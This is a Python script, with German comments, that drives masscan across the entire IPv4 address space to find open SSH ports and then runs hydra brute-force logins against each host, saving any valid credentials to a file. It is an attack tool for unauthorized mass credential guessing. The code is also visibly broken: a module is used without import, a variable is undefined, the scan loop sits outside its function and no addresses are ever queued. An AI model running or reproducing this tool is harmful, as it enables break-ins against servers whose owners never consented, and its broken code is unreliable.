import os
import queue
import threading
import subprocess
import time

# Files
UFILE = "users.txt"
PFILE = "passes.txt"
LOGS = "valid_creds.txt"
ELOGS = "error_log.txt"
start_ip = ipaddress.IPv4Address("0.0.0.0")  # Start-IP
end_ip = ipaddress.IPv4Address("255.255.255.254")  # Ende der Range

# Scannen in Batches
current_ip = start_ip

# Settings
RATE = "20000"
WORKERS = 1000
PORT = 22
RANGE = "0.0.0.0/0"
BATCH = "50000"

q = queue.Queue()
stats = {"scan": 0, "hits": 0, "fails": 0, "errors": 0}

def save_hit(creds):
    with open(LOGS, "a") as f:
        f.write(f"{creds}\n")
    stats["hits"] += 1

def save_err(err):
    with open(ELOGS, "a") as f:
        f.write(f"{err}\n")
    stats["errors"] += 1

def brute(ip):
    print(f"[+] Hydra -> {ip}")
    cmd = f"hydra -L {UFILE} -P {PFILE} {ip} ssh -t 128 -T 5 -W 1 -V 2>&1"
    res = subprocess.run(cmd, shell=True, capture_output=True, text=True).stdout

    found = False
    for line in res.split("\n"):
        if "password:" in line:
            print(f"[✔] {line}")
            save_hit(line)
            found = True
        elif "failed" in line.lower() or "invalid" in line.lower():
            stats["fails"] += 1
        elif "error" in line.lower():
            save_err(line)

    if not found:
        stats["fails"] += 1

def worker():
    while True:
        ip = q.get()
        if ip is None:
            break
        print(f"[+] Worker -> {ip}")
        brute(ip)
        q.task_done()

def scan():
    print("[*] Scanning...")
    last = "0.0.0.0"


while current_ip <= end_ip:
    # Berechne den nächsten Batch-Endpunkt (aber nicht über die Grenze hinaus)
    next_ip = min(current_ip + BATCH - 1, end_ip)
    
    # Masscan-Befehl erstellen
    cmd = f"masscan -p{PORT} --open --rate={RATE} --range {current_ip}-{next_ip} --output-format=json --output-filename={OUTPUT_FILE} --exclude 255.255.255.255"
    
    print(f"[DEBUG] Running: {cmd}")
    subprocess.run(cmd, shell=True)
    
    # Setze den Startpunkt für den nächsten Batch
    current_ip = next_ip + 1

    time.sleep(1)

def start_workers():
    threads = []
    for _ in range(WORKERS):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
        threads.append(t)
    return threads

def show_stats():
    while True:
        time.sleep(5)
        print(f"[STATS] Scanned: {stats['scan']} | Hits: {stats['hits']} | Fails: {stats['fails']} | Errors: {stats['errors']}")

def run():
    print("[*] Running...")
    start_workers()
    threading.Thread(target=scan, daemon=True).start()
    threading.Thread(target=show_stats, daemon=True).start()

    while True:
        time.sleep(5)

if __name__ == "__main__":
    run()
